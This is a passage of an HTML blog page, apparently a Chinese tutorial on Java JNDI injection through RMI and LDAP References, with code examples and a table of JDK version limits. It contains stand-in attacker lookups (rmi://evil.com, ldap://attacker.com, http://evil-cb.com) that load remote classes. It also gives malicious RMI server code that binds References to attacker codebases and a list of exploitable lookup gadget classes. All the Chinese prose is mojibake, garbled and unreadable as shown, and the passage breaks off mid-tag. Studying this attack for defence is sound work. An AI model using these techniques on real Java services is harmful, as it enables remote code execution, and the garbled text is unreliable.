class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"><span class="comment">//RegistryContextFactory æ˜¯RMI Registry Service Providerå¯¹åº”çš„Factory</span></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://www.0kai0.cn:8080&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">Object</span> <span class="variable">local_obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://www.0kai0.cn:8080/test&quot;</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­InitialContextç±»ä½œä¸ºJNDIå‘½åæœåŠ¡çš„å…¥å£ç‚¹ï¼Œè¯¥ç±»å®ç°äº†Contextæ¥å£ã€‚InitialContextæ„é€ å‡½æ•°éœ€è¦ä¸ºHashtableæˆ–è€…å…¶å­ç±»ã€‚åˆå§‹åŒ–æ—¶è¦æŒ‡å®šä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œé€šå¸¸æ˜¯JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚æ¯”å¦‚è¿™é‡Œæ˜¯RMIæœåŠ¡ï¼Œå°±æŒ‡å®šRMIçš„å·¥å‚å’Œurl</p><p>è¯¥ç§åˆå§‹åŒ–æ–¹å¼åˆ©ç”¨äº†å“ˆå¸Œè¡¨ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥è®¾ç½®valueå€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://www.0kai0.cn:8080&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure><ul><li><p>JNDIæä¾›çš„æœåŠ¡ï¼š</p><p>Java Naming å‘½åæœåŠ¡ã€‚è¿›è¡Œå‘½åï¼Œä¹Ÿå°±æ˜¯é”®å€¼å¯¹çš„ç»‘å®š</p><p>Java Directory ç›®å½•æœåŠ¡ã€‚ç›®å½•æœåŠ¡çš„å¯¹è±¡å¯ä»¥æœ‰å±æ€§ï¼Œåœ¨ç›®å½•æœåŠ¡ä¸­å¯ä»¥æ ¹æ®å±æ€§æ£€ç´¢å¯¹è±¡</p><p>ObjectFactory å¯¹è±¡å·¥å‚ã€‚å°†Naming Serviceï¼ˆå¦‚RMIï¼‰ä¸­å­˜å‚¨çš„æ•°æ®è½¬åŒ–ä¸ºJavaä¸­å¯è¡¨è¾¾çš„æ•°æ®ã€‚</p><p>JNDIæ³¨å…¥å°±æ˜¯è¿œç¨‹ä¸‹è½½è‡ªå®šä¹‰çš„ObjectFactoryç±»</p></li></ul><p>åœ¨JNDIä¸­æä¾›äº†bindç»‘å®šå’Œlookupæ£€ç´¢å¯¹è±¡ã€‚lookupé€šè¿‡åå­—è¿›è¡Œæ£€ç´¢</p><blockquote><p>RMIç»‘å®šçš„å¯¹è±¡å’ŒJNDIç»‘å®šå¯¹è±¡çš„åŒºåˆ«</p><p>1.çº¯RMIå®ç°ä¸­æ˜¯è°ƒç”¨java.rmiåŒ…å†…çš„bind()æˆ–rebind()æ–¹æ³•æ¥ç›´æ¥ç»‘å®šRMIæ³¨å†Œè¡¨ç«¯å£ã€‚JNDIè®¾ç½®æ—¶éœ€è¦é¢„å…ˆæŒ‡å®šå…¶ä¸Šä¸‹æ–‡ç¯å¢ƒå¦‚æŒ‡å®šä¸ºRMIæœåŠ¡ï¼Œæœ€åå†è°ƒç”¨javax.naming.InitialContext.bind()æ¥å°†æŒ‡å®šå¯¹è±¡ç»‘å®šåˆ°RMIæ³¨å†Œè¡¨ä¸­</p><p>2.çº¯RMIå®ç°ä¸­æ˜¯è°ƒç”¨java.rmiåŒ…å†…çš„lookup()æ–¹æ³•æ¥æ£€ç´¢ã€‚JNDIå®ç°çš„RMIå®¢æˆ·ç«¯æŸ¥è¯¢æ˜¯è°ƒç”¨javax.naming.InitialContext.lookup()æ–¹æ³•æ¥æ£€ç´¢</p></blockquote><h3 id="Referenceç±»"><a href="#Referenceç±»" class="headerlink" title="Referenceç±»"></a>Referenceç±»</h3><p>Referenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºNaming&#x2F;Directoryä¹‹å¤–çš„å¯¹è±¡å¼•ç”¨</p><p>å¯¹è±¡å¯ä»¥é€šè¿‡Referenceå­˜å‚¨åœ¨Namingæˆ–è€…DirectoryæœåŠ¡ä¸‹ã€‚æœ‰å¸ˆå‚…å¯èƒ½ä¼šé—®ï¼Œjavax.naming.InitialContext.bind()ä¸å°±æ˜¯ç»‘å®šå¯¹è±¡äº†å—ï¼Œä½†æ˜¯RMIç»‘å®šçš„å¯¹è±¡ä¸ºæœ¬åœ°è¿œç¨‹å¯¹è±¡ï¼ˆåœ¨æœ¬åœ°é¡¹ç›®æ–‡ä»¶å†…ï¼‰ï¼ŒReferenceå¯ä»¥è¿œç¨‹åŠ è½½ç±»(file&#x2F;ftp&#x2F;httpç­‰åè®®)ï¼Œå¹¶ä¸”å®ä¾‹åŒ–</p><blockquote><p>javaä¸­çš„å¯¹è±¡åˆ†æœ¬åœ°å¯¹è±¡å’Œè¿œç¨‹å¯¹è±¡ï¼Œæœ¬åœ°å¯¹è±¡é»˜è®¤å¯ä¿¡ä»»ã€‚è¿œç¨‹å¯¹è±¡æ ¹æ®å®‰å…¨ç®¡ç†å™¨åˆ’åˆ†åˆ°ä¸åŒçš„åŸŸï¼Œè€Œæ‹¥æœ‰ä¸åŒçš„æƒé™</p><p>ä¸è¿‡JNDIæœ‰ä¸¤ç§å®‰å…¨æ§åˆ¶æ–¹å¼ï¼Œå¯¹JNDI SPIå±‚ï¼ŒRMI\LDAP\CORBAçš„æ§åˆ¶æ–¹å¼ä¸åŒ</p><table><thead><tr><th align="center"></th><th>è¿œç¨‹åŠ è½½ç±»æƒé™</th><th>å®‰å…¨ç®¡ç†å™¨å¼ºåˆ¶å®æ–½</th></tr></thead><tbody><tr><td align="center">RMI</td><td>java.rmi.server.userCodebaseOnly&#x3D;false(JDK&gt;7u21&#x3D;true)</td><td>Always</td></tr><tr><td align="center">LDAP</td><td>com.sun.jndi.ldap.object.trustURLCodebase&#x3D;true(é»˜è®¤flase)</td><td>éå¼ºåˆ¶</td></tr><tr><td align="center">CORBA</td><td></td><td>always</td></tr></tbody></table></blockquote><h3 id="JNDIåè®®åŠ¨æ€è½¬æ¢"><a href="#JNDIåè®®åŠ¨æ€è½¬æ¢" class="headerlink" title="JNDIåè®®åŠ¨æ€è½¬æ¢"></a>JNDIåè®®åŠ¨æ€è½¬æ¢</h3><p>æœ‰çš„æ—¶å€™ä½ æŒ‡å®šäº†RMIæœåŠ¡ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨çš„æ—¶å€™ç”¨åˆ°LDAPæœåŠ¡çš„ç»‘å®šå¯¹è±¡ã€‚å¯ä»¥ç›´æ¥æŒ‡å®šåè®®ï¼Œåœ¨lookup()ã€search()ä¼šè®¿é—®LDAPæœåŠ¡çš„å¯¹è±¡è€ŒéRMIï¼ˆé‚£è®¾ç½®å·¥å‚æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿå…¶å®è®¾ç½®å·¥å‚æ˜¯ä¸ºäº†bind()å¯¹è±¡åˆ°RMIæœåŠ¡ï¼Œè‡³äºsearchã€lookupè¿™ç§å·¥ä½œä¸å±€é™äºRMIï¼Œæ‰€ä»¥å°±åŠ¨æ€è½¬æ¢äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨lookup()çš„æºç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼ŒgetURLOrDefaultInitCtx()å°è¯•è·å–å¯¹åº”åè®®çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</p><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><h3 id="åˆ©ç”¨JNDI-Referencesè¿›è¡Œæ³¨å…¥ï¼ˆRMIï¼‰"><a href="#åˆ©ç”¨JNDI-Referencesè¿›è¡Œæ³¨å…¥ï¼ˆRMIï¼‰" class="headerlink" title="åˆ©ç”¨JNDI Referencesè¿›è¡Œæ³¨å…¥ï¼ˆRMIï¼‰"></a>åˆ©ç”¨JNDI Referencesè¿›è¡Œæ³¨å…¥ï¼ˆRMIï¼‰</h3><p>RMI Serveré™¤äº†å¯ä»¥ç›´æ¥ç»‘å®šè¿œç¨‹å¯¹è±¡å¤–ï¼ˆå…ˆnewåbindï¼‰ï¼Œè¿˜èƒ½é€šè¿‡<code>References</code>ç±»æ¥ç›´æ¥ç»‘å®šå¤–éƒ¨è¿œç¨‹å¯¹è±¡ã€‚</p><p>å½“ç»‘å®šåœ¨RMIæ³¨å†Œè¡¨ä¸­çš„Referenceï¼ŒæŒ‡å‘æ¶æ„è¿œç¨‹classæ–‡ä»¶ã€‚å¹¶ä¸”JNDIå®¢æˆ·ç«¯lookup()å‚æ•°å¯æ§ï¼ˆæˆ–è€…ReferenceæŒ‡å®šè¿œç¨‹ç±»å‚æ•°å¯æ§ï¼‰ï¼Œèƒ½å®ç°RCE</p><blockquote><p>æ”»å‡»åŸç†ï¼š</p><ol><li>æ”»å‡»è€…é€šè¿‡å¯æ§çš„ URI å‚æ•°è§¦å‘åŠ¨æ€ç¯å¢ƒè½¬æ¢ï¼Œä¾‹å¦‚è¿™é‡Œ URI ä¸º <code>rmi://evil.com:1099/refObj</code>ï¼›</li><li>åŸå…ˆé…ç½®å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ <code>rmi://localhost:1099</code> ä¼šå› ä¸ºåŠ¨æ€ç¯å¢ƒè½¬æ¢è€Œè¢«æŒ‡å‘ <code>rmi://evil.com:1099/</code>ï¼›</li><li>åº”ç”¨å» <code>rmi://evil.com:1099</code> è¯·æ±‚ç»‘å®šå¯¹è±¡ <code>refObj</code>ï¼Œæ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„ RMI æœåŠ¡ä¼šè¿”å›ä¸åç§° <code>refObj</code>æƒ³ç»‘å®šçš„ ReferenceWrapper å¯¹è±¡ï¼ˆ<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>ï¼‰ï¼›</li><li>åº”ç”¨è·å–åˆ° <code>ReferenceWrapper</code> å¯¹è±¡å¼€å§‹ä»æœ¬åœ° <code>CLASSPATH</code> ä¸­æœç´¢ <code>EvilObject</code> ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä» <code>http://evil-cb.com/</code> ä¸Šå»å°è¯•è·å– <code>EvilObject.class</code>ï¼Œå³åŠ¨æ€çš„å»è·å– <code>http://evil-cb.com/EvilObject.class</code>ï¼›</li><li>æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æœåŠ¡è¿”å›ç¼–è¯‘å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ <code>EvilObject.class</code>ï¼›</li><li>åº”ç”¨å¼€å§‹è°ƒç”¨ <code>EvilObject</code> ç±»çš„æ„é€ å‡½æ•°ï¼Œå› æ”»å‡»è€…äº‹å…ˆå®šä¹‰åœ¨æ„é€ å‡½æ•°ï¼Œè¢«åŒ…å«åœ¨é‡Œé¢çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼›</li></ol></blockquote><ul><li>ç¤ºä¾‹ï¼š</li></ul><p>JNDIClientï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(rmi:<span class="comment">//127.0.0.1:1099/refObj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServerï¼š</p><p>RMIç»‘å®šçš„è¿œç¨‹å¯¹è±¡éœ€è¦ç»§æ‰¿UnicastRemoteObjectç±»å¹¶å®ç°Remoteæ¥å£ï¼ŒReferenceWrapperç±»å°±ç¬¦åˆæ¡ä»¶ã€‚ç”¨ReferenceWrapperå¯¹Referenceè¿›è¡Œå°è£…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//Registryå†™åœ¨serveré‡Œ</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Referenceæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨æœ¬åœ°æŸ¥æ‰¾EvilObjectç±»ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä»<code>http://127.0.0.1:8080/</code>æœç´¢ç¬¬äºŒä¸ªå‚æ•°åçš„EvilObjectç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡ç«¯Reference-classFactoryLocationå¯æ§"><a href="#æœåŠ¡ç«¯Reference-classFactoryLocationå¯æ§" class="headerlink" title="æœåŠ¡ç«¯Reference classFactoryLocationå¯æ§"></a>æœåŠ¡ç«¯Reference classFactoryLocationå¯æ§</h4><p>åœ¨Referenceæ„é€ å‡½æ•°ä¸­çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¿œç¨‹åŠ è½½ç±»çš„URLåœ°å€ï¼Œç§°ä¸ºclassFactoryLocationã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨æœåŠ¡ç«¯ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µå¾ˆå°‘è§ã€‚</p><p>å¦‚ä¸‹Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>, <span class="string">&quot;EvilClassFactory&quot;</span>, uri);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;demo&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°uriå¯æ§ï¼Œå½“æŒ‡å‘æ”»å‡»è€…è‡ªå·±çš„webæœåŠ¡å™¨ï¼Œæ”»å‡»è€…å°†EvilClassFactoryæ¶æ„ç±»æ”¾åˆ°è‡ªå·±çš„webæœåŠ¡å™¨ä¸‹ uriè·¯å¾„ã€‚RMIå®¢æˆ·ç«¯é€šè¿‡JNDIæŸ¥è¯¢ç»‘å®šçš„ç±»æ—¶ï¼Œä¼šè¿œç¨‹åŠ è½½æ¶æ„ç±»é€ æˆå‘½ä»¤æ‰§è¡Œ</p><h4 id="å®¢æˆ·ç«¯lookupå‚æ•°å¯æ§"><a href="#å®¢æˆ·ç«¯lookupå‚æ•°å¯æ§" class="headerlink" title="å®¢æˆ·ç«¯lookupå‚æ•°å¯æ§"></a>å®¢æˆ·ç«¯lookupå‚æ•°å¯æ§</h4><p>å¦‚JNDIå®¢æˆ·ç«¯lookup()æ¥æ”¶å¤–éƒ¨å¯æ§å‚æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥ä¼ å…¥æ¶æ„URIåœ°å€æŒ‡å‘æ”»å‡»è€…çš„RMIRegistryï¼Œæ„é€ æ¶æ„RMIServerï¼Œè‡ªç„¶ä¹Ÿèƒ½æ„é€ RMIæ³¨å†Œè¡¨çš„æ¶æ„ç±»ã€‚æ¯”å¦‚æ”»å‡»è€…æ­å»ºçš„æ¶æ„AServerï¼ˆå›¾æ–¹ä¾¿æ³¨å†Œè¡¨å’Œserverä¸€èµ·å†™ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>, <span class="string">&quot;EvilClassFactory&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Binding &#x27;exp&#x27; to &#x27;rmi://127.0.0.1:1688/exp&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡ç«¯å†™æ¶æ„EvilClassï¼Œæˆ–è€…URLç›®å½•ä¸‹(test&#x2F;)å†™æ¶æ„EvilClassFactoryéƒ½èƒ½é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>æ­¤æ—¶å‘lookupä¼ æŒ‡å‘æ¶æ„Serverçš„å‚æ•°ï¼šrmi:&#x2F;&#x2F;127.0.0.1:1688&#x2F;exp</p><p><strong>å°ç»†èŠ‚</strong>ï¼šå½“ä½¿ç”¨lookupæŒ‡å®šrmiæœåŠ¡æ¥æœå¯»ç±»æ—¶ï¼Œæœå¯»åˆ°çš„ç±»éœ€è¦æ»¡è¶³è¿œç¨‹ç±»çš„è¦æ±‚ï¼šç»§æ‰¿UnicastRemoteObjectå¹¶å®ç°Remoteæ¥å£</p><p>é€ æˆè¯¥æ¼æ´éœ€è¦ èƒ½å®ç°åŠ¨æ€è½¬æ¢uriçš„InitialContext.lookup()</p><p>RMIè°ƒç”¨äº†è¯¥å‡½æ•°çš„ç±»æœ‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure><p>LDAPè°ƒç”¨äº†è¯¥å‡½æ•°çš„ç±»æœ‰ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring&#x27;s LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure><p>åœ¨ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨readObjectå¯»æ‰¾å¯è¢«å¤–éƒ¨æ§åˆ¶çš„lookup()æ–¹æ³•ï¼Œæ¥è§¦å‘ååºåˆ—åŒ–æ¼æ´</p><h3 id="åˆ©ç”¨JNDI-Referencesè¿›è¡Œæ³¨å…¥ï¼ˆLDAPï¼‰"><a href="#åˆ©ç”¨JNDI-Referencesè¿›è¡Œæ³¨å…¥ï¼ˆLDAPï¼‰" class="headerlink" title="åˆ©ç”¨JNDI Referencesè¿›è¡Œæ³¨å…¥ï¼ˆLDAPï¼‰"></a>åˆ©ç”¨JNDI Referencesè¿›è¡Œæ³¨å…¥ï¼ˆLDAPï¼‰</h3><p>JNDIå¯¹æ¥LDAPæœåŠ¡æ—¶ï¼Œé™¤äº†lookupæ—¶æŒ‡å®šLDAPåœ°å€ï¼š<code>ldap://xxx</code>å¤–æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ä½†æ˜¯ç”±äºä¸Šé¢æåˆ°çš„å®‰å…¨ç®¡ç†å™¨ï¼ŒLDAPä¸å—<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>ç­‰å±æ€§çš„é™åˆ¶ï¼ŒåŠ ä¸Šæ–°åŠ å…¥äº†<code>com.sun.jndi.ldap.object.trustURLCodebase</code>ï¼Œæ‰€ä»¥åˆ©ç”¨ç‰ˆæœ¬ä¸åŒã€‚</p><p>è¿™é‡Œæ€»ç»“ä¸€å¼ JNDIæ³¨å…¥å¯¹ç‰ˆæœ¬è¦æ±‚çš„è¡¨ï¼š</p><table><thead><tr><th>JNDIæœåŠ¡</th><th>éœ€è¦çš„å®‰å…¨å±æ€§å€¼</th><th>version</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>RMI</td><td>java.rmi.server.useCodebaseOnly&#x3D;&#x3D;false</td><td>jdk&gt;&#x3D;6u45ã€7u21 true</td><td>trueæ—¶ç¦ç”¨è‡ªåŠ¨è¿œç¨‹åŠ è½½ç±»</td></tr><tr><td>RMIã€CORBA</td><td>com.sun.jndi.rmi.object.trustURLCodebase&#x3D;&#x3D;true</td><td>jdk&gt;&#x3D;6u141ã€7u131ã€8u121 false</td><td>flaseç¦æ­¢é€šè¿‡RMIå’ŒCORBAä½¿ç”¨è¿œç¨‹codebase</td></tr><tr><td>LDAP</td><td>com.sun.jndi.ldap.object.trustURLCodebase&#x3D;&#x3D;true</td><td>jdk&gt;&#x3D;8u191ã€7u201ã€6u211 ã€11.0.1 false</td><td>falseç¦æ­¢é€šè¿‡LDAPåè®®ä½¿ç”¨è¿œç¨‹codebase</td></tr></tbody></table><h2 id="JNDI-lookup-è§£æ"><a href="#JNDI-lookup-è§£æ" class="headerlink" title="JNDI lookup()è§£æ"></a>JNDI lookup()è§£æ</h2><p><code>java.naming.InitialContext.java#lookup()</code>ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215185303011.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215185303011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŒç»­è·Ÿè¿›lookupåˆ°<code>com.sun.jndi.rmi.registry.RegistryContext.class</code>ï¼Œlookupï¼šlookupè·å–RMIæœåŠ¡å™¨ä¸Šçš„å¯¹è±¡å¼•ç”¨ï¼Œèµ‹å€¼ç»™var2(æ‹·è´å¯¹è±¡åˆ°æ³¨å†Œè¡¨)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215191945111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215191945111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éšåæ‰§è¡ŒdecodeObject:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215192036957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215192036957.png" 